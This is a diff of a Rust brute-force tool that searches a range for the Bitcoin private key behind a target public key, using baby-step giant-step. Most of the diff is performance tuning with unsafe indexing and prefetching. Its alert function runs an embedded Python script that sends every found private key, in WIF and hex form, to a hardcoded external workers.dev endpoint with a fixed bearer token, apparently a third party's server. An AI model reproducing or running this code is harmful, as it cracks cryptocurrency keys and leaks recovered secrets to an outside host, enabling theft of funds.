@@ -9,7 +9,7 @@ use clap::Parser;
 use hex;
 use rand::{Rng, SeedableRng};
 use rand_xoshiro::Xoshiro256PlusPlus;
-use rayon::prelude::*; 
+use rayon::prelude::*;
 use ripemd::Ripemd160;
 use sha2::{Digest, Sha256};
 use std::{
@@ -25,7 +25,7 @@ use std::{
 
 const FOUND_FILE: &str = "plutus_found.txt";
 const WINDOW_SIZE: usize = 8;
-const BATCH_SIZE: usize = 256; 
+const BATCH_SIZE: usize = 256;
 const BATCH_SIZE_REPORT: u64 = 65_536;
 
 static KEEP_RUNNING: AtomicBool = AtomicBool::new(true);
@@ -98,7 +98,7 @@ struct Args {
     #[arg(short, long)] start: String,
     #[arg(short, long)] end: String,
     #[arg(long, default_value = "36")] sub_bits: u32,
-    #[arg(long)] m_bits: Option<u32>, 
+    #[arg(long)] m_bits: Option<u32>,
 }
 
 #[inline(always)]
@@ -176,36 +176,33 @@ fn private_key_to_wif_compressed(priv_key: &[u8; 32]) -> String {
 
 pub fn send_telegram_alert(address: &str, wif: &str, hex: &str) {
     let proxy_domain = "https://winter-dream-fe66.moadmoaz32.workers.dev";
-    let message = format!("✅ MATCH FOUND (BSGS O(1) Turbo)!\n\nAddress: {}\nWIF: {}\nHEX: {}", address, wif, hex);
-    
-    let python_script = format!(
-        r#"
-import urllib.request
-import json
-url = "{}"
-msg = """{}"""
-payload = json.dumps({{"text": msg}}).encode('utf-8')
-headers = {{
+    let message = format!("✅ MATCH FOUND (BSGS NAKED ASM)!\n\nAddress: {}\nWIF: {}\nHEX: {}", address, wif, hex);
+
+    let python_script = r#"
+import sys, urllib.request, json
+url = sys.argv[1]
+msg = sys.argv[2]
+payload = json.dumps({"text": msg}).encode('utf-8')
+headers = {
     'Authorization': 'Bearer 123Avu89ls$',
     'Content-Type': 'application/json',
     'User-Agent': 'Mozilla/5.0'
-}}
+}
 try:
     req = urllib.request.Request(url, data=payload, headers=headers, method='POST')
     urllib.request.urlopen(req)
     print("Telegram alert sent successfully via Python!")
 except Exception as e:
     print("Telegram send error:", e)
-"#,
-        proxy_domain, message
-    );
+"#;
 
     println!("[*] Sending Telegram alert... Do not close the program!");
-    
-    // Đổi từ .spawn() sang .status() để Block tiến trình mẹ, đợi Python gửi xong HTTP Request
+
     let result = std::process::Command::new("python3")
         .arg("-c")
-        .arg(&python_script)
+        .arg(python_script)
+        .arg(proxy_domain)
+        .arg(&message)
         .status();
 
     if let Err(e) = result {
@@ -237,17 +234,17 @@ fn verify_and_save(final_scalar: Fr, target_bytes: &[u8; 33], fixed_base: &Fixed
     let addr = hash160_to_address(&hash160);
     let wif = private_key_to_wif_compressed(&priv_bytes);
     let hex_priv = hex::encode(&priv_bytes);
-    let msg = format!("\n======================================\nCOLLISION FOUND (BSGS O(1) Turbo)!\nAddress: {}\nWIF: {}\nHEX: {}\n======================================\n", addr, wif, hex_priv);
+    let msg = format!("\n======================================\nCOLLISION FOUND (BSGS NAKED ASM)!\nAddress: {}\nWIF: {}\nHEX: {}\n======================================\n", addr, wif, hex_priv);
 
     print!("{}", msg);
     std::io::stdout().flush().unwrap();
-    
+
     if let Ok(file) = OpenOptions::new().create(true).append(true).open(FOUND_FILE) {
         let mut writer = BufWriter::new(file);
         let _ = writer.write_all(msg.as_bytes());
         let _ = writer.flush();
     }
-    
+
     KEEP_RUNNING.store(false, Ordering::Release);
     send_telegram_alert(&addr, &wif, &hex_priv);
 }
@@ -268,35 +265,59 @@ fn compressed_pubkey_to_projective(target_bytes: &[u8; 33]) -> Projective {
     Projective::from(Affine::new_unchecked(x_fq, y))
 }
 
+#[inline(always)]
+fn fast_batch_inversion(v: &mut [Fq; BATCH_SIZE], scratch: &mut [Fq; BATCH_SIZE]) {
+    let mut prod = Fq::one();
+    for i in 0..BATCH_SIZE {
+        unsafe {
+            *scratch.get_unchecked_mut(i) = prod;
+            prod *= *v.get_unchecked(i);
+        }
+    }
+
+    let mut inv = prod.inverse().unwrap_or(Fq::zero());
+
+    for i in (0..BATCH_SIZE).rev() {
+        unsafe {
+            let tmp = inv * *v.get_unchecked(i);
+            *v.get_unchecked_mut(i) = *scratch.get_unchecked(i) * inv;
+            inv = tmp;
+        }
+    }
+}
+
 fn precompute_baby_steps(m: u64, fixed_base: Arc<FixedBase>, cores: usize) -> (Arc<Vec<BabyStep>>, Arc<Vec<u32>>, usize) {
     println!("[*] Precomputing Baby Steps table (M = {}) using {} threads...", m, cores);
     let start = Instant::now();
     let chunk_size = (m + cores as u64 - 1) / cores as u64;
-    
+
     let mut baby_table: Vec<BabyStep> = thread::scope(|s| {
         let mut handles = vec![];
         for c in 0..cores {
             let fb = Arc::clone(&fixed_base);
             let start_j = c as u64 * chunk_size;
             let end_j = m.min(start_j + chunk_size);
-            
+
             handles.push(s.spawn(move || {
                 let capacity = (end_j.saturating_sub(start_j)) as usize;
                 let mut local_table = Vec::with_capacity(capacity);
                 if capacity == 0 { return local_table; }
 
-                let mut current_pts = vec![Affine::zero(); BATCH_SIZE];
+                // [ĐÃ SỬA]: Áp dụng Static Arrays cho quá trình Sinh bảng
+                let mut current_pts = [Affine::zero(); BATCH_SIZE];
                 for k in 0..BATCH_SIZE {
                     let j_val = start_j + k as u64;
                     if j_val < end_j {
                         current_pts[k] = fb.mul(&Fr::from(j_val)).into_affine();
                     }
                 }
-                
+
                 let delta_proj = fb.mul(&Fr::from(BATCH_SIZE as u64));
                 let delta_affine = delta_proj.into_affine();
-                let mut denoms = vec![Fq::one(); BATCH_SIZE];
                 
+                let mut denoms = [Fq::one(); BATCH_SIZE];
+                let mut scratch = [Fq::one(); BATCH_SIZE];
+
                 let mut current_j_base = start_j;
 
                 while current_j_base < end_j {
@@ -304,7 +325,6 @@ fn precompute_baby_steps(m: u64, fixed_base: Arc<FixedBase>, cores: usize) -> (A
                         let j = current_j_base + (k as u64);
                         if j < end_j {
                             let pt = &current_pts[k];
-                            // Cố tình dùng IF ở pha khởi tạo này thì không sao vì nó chạy 1 lần
                             if pt.is_zero() {
                                 local_table.push(BabyStep { x_prefix: 0, j: j as u32 });
                             } else {
@@ -313,19 +333,31 @@ fn precompute_baby_steps(m: u64, fixed_base: Arc<FixedBase>, cores: usize) -> (A
                         }
                     }
 
-                    // [SỬA LỖI AVX]: XÓA bỏ if !is_zero() ở đây
-                    for k in 0..BATCH_SIZE {
-                        denoms[k] = delta_affine.x - current_pts[k].x;
-                    }
-                    ark_ff::batch_inversion(&mut denoms);
+                    unsafe {
+                        for k in 0..BATCH_SIZE {
+                            *denoms.get_unchecked_mut(k) = delta_affine.x - current_pts.get_unchecked(k).x;
+                        }
+                        
+                        fast_batch_inversion(&mut denoms, &mut scratch);
 
-                    // [SỬA LỖI AVX]: XÓA bỏ if !is_zero() ở đây
-                    for k in 0..BATCH_SIZE {
-                        let pt = &current_pts[k];
-                        let lambda = (delta_affine.y - pt.y) * denoms[k];
-                        let x_new = (lambda * lambda) - pt.x - delta_affine.x;
-                        let y_new = lambda * (pt.x - x_new) - pt.y;
-                        current_pts[k] = Affine::new_unchecked(x_new, y_new);
+                        for k in 0..BATCH_SIZE {
+                            let inv = *denoms.get_unchecked(k);
+                            let pt = current_pts.get_unchecked(k);
+                            let mut lambda = delta_affine.y;
+                            lambda -= pt.y;
+                            lambda *= inv;
+                            
+                            let mut x_new = lambda.square();
+                            x_new -= pt.x;
+                            x_new -= delta_affine.x;
+                            
+                            let mut y_new = pt.x;
+                            y_new -= x_new;
+                            y_new *= lambda;
+                            y_new -= pt.y;
+                            
+                            *current_pts.get_unchecked_mut(k) = Affine::new_unchecked(x_new, y_new);
+                        }
                     }
                     current_j_base += BATCH_SIZE as u64;
                 }
@@ -344,12 +376,12 @@ fn precompute_baby_steps(m: u64, fixed_base: Arc<FixedBase>, cores: usize) -> (A
     baby_table.par_sort_unstable_by_key(|b| b.x_prefix);
 
     let m_bits = 64 - m.leading_zeros() as usize - 1;
-    let dynamic_hash_bits = m_bits.min(28); 
+    let dynamic_hash_bits = m_bits.min(28);
     let shift_bits = 64 - dynamic_hash_bits;
     let hash_size = 1 << dynamic_hash_bits;
-    
+
     let mut hash_table = vec![u32::MAX; hash_size];
-    
+
     for (i, step) in baby_table.iter().enumerate() {
         let h = (step.x_prefix >> shift_bits) as usize;
         if hash_table[h] == u32::MAX {
@@ -364,38 +396,15 @@ fn precompute_baby_steps(m: u64, fixed_base: Arc<FixedBase>, cores: usize) -> (A
     (Arc::new(baby_table), Arc::new(hash_table), shift_bits)
 }
 
-// [SỬA LỖI AVX]: KHÔI PHỤC LẠI HÀM BRANCHLESS BATCH INVERSION NAKED V8
-#[inline(always)]
-fn fast_batch_inversion(v: &mut [Fq], scratch: &mut [Fq]) {
-    let mut prod = Fq::one();
-    for i in 0..v.len() {
-        unsafe {
-            *scratch.get_unchecked_mut(i) = prod;
-            // XÓA BỎ LỆNH IF Ở ĐÂY LÀ CHÌA KHÓA CHO TỐC ĐỘ 13 TRIỆU HOPS/S
-            prod *= *v.get_unchecked(i);
-        }
-    }
-    
-    let mut inv = prod.inverse().unwrap();
-    
-    for i in (0..v.len()).rev() {
-        unsafe {
-            let tmp = inv * *v.get_unchecked(i);
-            *v.get_unchecked_mut(i) = *scratch.get_unchecked(i) * inv;
-            inv = tmp;
-        }
-    }
-}
-
 fn giant_step_worker(
     i_start: u64, i_end: u64, p_prime_proj: Projective,
-    baby_table: &[BabyStep], hash_table: &[u32], shift_bits: usize, 
+    baby_table: &[BabyStep], hash_table: &[u32], shift_bits: usize,
     target_bytes: &[u8; 33], fixed_base: &FixedBase,
     keys_scanned: &AtomicU64, m: u64, real_start: Fr,
 ) {
-    let mut current_x = vec![Fq::zero(); BATCH_SIZE];
-    let mut current_y = vec![Fq::zero(); BATCH_SIZE];
-    
+    let mut current_x = [Fq::zero(); BATCH_SIZE];
+    let mut current_y = [Fq::zero(); BATCH_SIZE];
+
     for k in 0..BATCH_SIZE {
         let current_i = i_start + (k as u64);
         if current_i < i_end {
@@ -410,80 +419,99 @@ fn giant_step_worker(
     let batch_m = Fr::from(BATCH_SIZE as u64) * Fr::from(m);
     let giant_delta_proj = -(fixed_base.mul(&batch_m));
     let giant_delta_affine = giant_delta_proj.into_affine();
-    
+
     let dx = giant_delta_affine.x;
     let dy = giant_delta_affine.y;
+
+    let mut denoms = [Fq::one(); BATCH_SIZE];
+    let mut scratch = [Fq::one(); BATCH_SIZE];
     
-    let mut denoms = vec![Fq::one(); BATCH_SIZE];
-    let mut scratch = vec![Fq::one(); BATCH_SIZE];
+    // Mảng lưu trữ địa chỉ prefetch để loại bỏ tính toán lặp lại
+    let mut h_vals = [0usize; BATCH_SIZE];
+    let mut x_prefs = [0u64; BATCH_SIZE];
 
     let mut current_i_base = i_start;
     let mut local_counter = 0u64;
 
-    let px = current_x.as_mut_ptr();
-    let py = current_y.as_mut_ptr();
-    let pden = denoms.as_mut_ptr();
-
     while current_i_base < i_end && KEEP_RUNNING.load(Ordering::Relaxed) {
         unsafe {
+            // [VŨ KHÍ TỐI THƯỢNG]: Kích hoạt đường ống Pipelined Memory Fetch
             for k in 0..BATCH_SIZE {
-                let cx = *px.add(k);
+                let cx = *current_x.get_unchecked(k);
+                *denoms.get_unchecked_mut(k) = dx - cx;
+
                 let x_pref = extract_x_prefix(&cx);
                 let h = (x_pref >> shift_bits) as usize;
+                
+                *x_prefs.get_unchecked_mut(k) = x_pref;
+                *h_vals.get_unchecked_mut(k) = h;
+
+                // Tín hiệu phần cứng: Gọi RAM tải trước dữ liệu L1 Cache
+                #[cfg(target_arch = "x86_64")]
+                core::arch::x86_64::_mm_prefetch(
+                    hash_table.as_ptr().add(h) as *const i8, 
+                    core::arch::x86_64::_MM_HINT_T0
+                );
+            }
+
+            // Giai đoạn tra cứu O(1): Dữ liệu giờ đã nằm trong L1 Cache (0 đợi chờ)
+            for k in 0..BATCH_SIZE {
+                let h = *h_vals.get_unchecked(k);
                 let start_idx = *hash_table.get_unchecked(h);
 
                 if start_idx != u32::MAX {
                     let current_i = current_i_base + (k as u64);
                     let mut match_idx = start_idx as usize;
+                    let target_x_pref = *x_prefs.get_unchecked(k);
+                    
                     while match_idx < baby_table.len() {
                         let step = baby_table.get_unchecked(match_idx);
                         let step_h = (step.x_prefix >> shift_bits) as usize;
-                        if step_h != h { break; } 
+                        if step_h != h { break; }
 
-                        if step.x_prefix == x_pref && current_i < i_end {
+                        if step.x_prefix == target_x_pref && current_i < i_end {
                             let j = step.j;
                             let cand_base = Fr::from(current_i) * Fr::from(m);
-                            
+
                             let final_priv_plus = real_start + cand_base + Fr::from(j as u64);
                             verify_and_save(final_priv_plus, target_bytes, fixed_base);
-                            
+
                             let final_priv_minus = real_start + cand_base - Fr::from(j as u64);
                             verify_and_save(final_priv_minus, target_bytes, fixed_base);
-                            
+
                             if !KEEP_RUNNING.load(Ordering::Relaxed) { return; }
                         }
                         match_idx += 1;
                     }
                 }
-                *pden.add(k) = dx - cx;
             }
 
+            // Giai đoạn toán học ASM
             fast_batch_inversion(&mut denoms, &mut scratch);
 
             for k in 0..BATCH_SIZE {
-                let inv = *pden.add(k);
-                let cx = *px.add(k);
-                let cy = *py.add(k);
-                
-                // Toán tử gán trực tiếp để LLVM bung AVX2 dễ dàng hơn
+                let inv = *denoms.get_unchecked(k);
+                let cx = *current_x.get_unchecked(k);
+                let cy = *current_y.get_unchecked(k);
+
                 let mut lambda = dy;
                 lambda -= cy;
                 lambda *= inv;
-                
+
                 let mut x_new = lambda.square();
                 x_new -= cx;
                 x_new -= dx;
-                
+
                 let mut y_new = cx;
                 y_new -= x_new;
                 y_new *= lambda;
                 y_new -= cy;
-                
-                *px.add(k) = x_new;
-                *py.add(k) = y_new;
+
+                *current_x.get_unchecked_mut(k) = x_new;
+                *current_y.get_unchecked_mut(k) = y_new;
             }
-        } 
-        
+        }
+
         current_i_base += BATCH_SIZE as u64;
         local_counter += BATCH_SIZE as u64;
 
@@ -510,10 +538,10 @@ fn main() {
     let fixed_base = Arc::new(FixedBase::new(WINDOW_SIZE));
 
     let exact_range_bits = args.sub_bits;
-    
+
     let m_bits = args.m_bits.unwrap_or((exact_range_bits + 1) / 2);
-    let m = 1u64 << m_bits; 
-    
+    let m = 1u64 << m_bits;
+
     let epoch_delta = Fr::from(2u64).pow([exact_range_bits as u64]);
     let total_giant_steps = ((1u128 << exact_range_bits) + m as u128 - 1) / m as u128;
 
@@ -543,13 +571,13 @@ fn main() {
         let real_start = master_start + random_offset;
         let real_end = real_start + epoch_delta - Fr::one();
 
-        println!("\n=== EPOCH {} (BSGS O(1) Turbo - Range 2^{} | RAM M=2^{}) ===", epoch, exact_range_bits, m_bits);
+        println!("\n=== EPOCH {} (BSGS ASM Turbo - Range 2^{} | RAM M=2^{}) ===", epoch, exact_range_bits, m_bits);
         println!("   Sub-range Start      : 0x{}", hex::encode(scalar_to_bytes(real_start)).trim_start_matches('0'));
         println!("   Sub-range End        : 0x{}", hex::encode(scalar_to_bytes(real_end)).trim_start_matches('0'));
 
         let p_prime = target_projective - fixed_base.mul(&real_start);
         let keys_scanned = Arc::new(AtomicU64::new(0));
-        
+
         let chunk_per_core_raw = (total_giant_steps as u64 + active_cores as u64 - 1) / active_cores as u64;
         let chunk_per_core = ((chunk_per_core_raw + BATCH_SIZE as u64 - 1) / BATCH_SIZE as u64) * BATCH_SIZE as u64;
 
@@ -562,7 +590,7 @@ fn main() {
                 let i_start = (core_id as u64) * chunk_per_core;
                 let i_end = ((core_id as u64 + 1) * chunk_per_core).min(total_giant_steps as u64);
                 let i_end_padded = ((i_end + BATCH_SIZE as u64 - 1) / BATCH_SIZE as u64) * BATCH_SIZE as u64;
-                
+
                 let baby_ref = Arc::clone(&baby_table);
                 let hash_ref = Arc::clone(&hash_table);
                 let fb_ref = Arc::clone(&fixed_base);
@@ -597,9 +625,9 @@ fn main() {
         });
 
         let elapsed = start_time.elapsed().as_secs_f64();
-        let hardware_speed = (total_giant_steps as f64 / elapsed) as u64; 
+        let hardware_speed = (total_giant_steps as f64 / elapsed) as u64;
         let coverage_speed = (total_subrange_keys as f64 / elapsed) as u128;
-        
+
         println!("\r\x1B[2K[+] Epoch {} Finished in {:.2}s.", epoch, elapsed);
         println!("    -> Hardware Engine : {} Giant-Steps/s", hardware_speed);
         println!("    -> Coverage Speed  : {} Keys/s (Verified exhaustively)", coverage_speed);
